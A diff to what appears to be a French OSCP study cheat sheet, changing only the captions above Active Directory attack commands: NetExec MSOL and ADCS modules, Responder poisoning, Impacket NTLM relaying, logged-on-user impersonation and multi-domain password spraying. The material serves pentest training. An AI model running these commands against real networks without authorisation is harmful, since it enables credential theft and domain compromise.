@@ -1695,7 +1695,7 @@ netexec ldap [target] -u [username] -p [password] -M adcs
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec smb [target] -u [username] -p [password] -M msol
@@ -1705,7 +1705,7 @@ netexec smb [target] -u [username] -p [password] -M msol
 #### NTLM Relay Attack
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec smb [target(s)] --gen-relay-list relay.txt
@@ -1726,14 +1726,14 @@ cat relay_list.txt
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil responder.</p>
+<p class="oscp-command-note">Observer les requêtes de résolution de noms.</p>
 
 ```bash
 responder -I eth0
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-ntlmrelayx.</p>
+<p class="oscp-command-note">Commande Impacket dans la rubrique « NTLM Relay Attack ».</p>
 
 ```bash
 impacket-ntlmrelayx -tf relay.txt -smb2support
@@ -1743,7 +1743,7 @@ impacket-ntlmrelayx -tf relay.txt -smb2support
 ### Impersonate logged-on Users
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil nxc.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 nxc smb [target] -u [localAdmin] -p [password] --loggedon-users
@@ -1764,14 +1764,14 @@ nxc smb [target] -u [localAdmin] -p [password] -M schtask_as -o USER=[logged-on-
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec [protocol] [target(s)] -u FILE -p password
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil domain1.</p>
+
 
 ```text
 DOMAIN1\user
@@ -1779,21 +1779,21 @@ DOMAIN2\user
 ```
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Multi-Domain Environment ».</p>
+
 
 ```text
 [domains]\[users]
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>
+<p class="oscp-command-note">Exécuter un script Python.</p>
 
 ```bash
 python3 script.py -u [users_list].txt -d [domains_list].txt
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil import.</p>
+<p class="oscp-command-note">Script Python lié à « Multi-Domain Environment ».</p>
 
 ```python
 import argparse
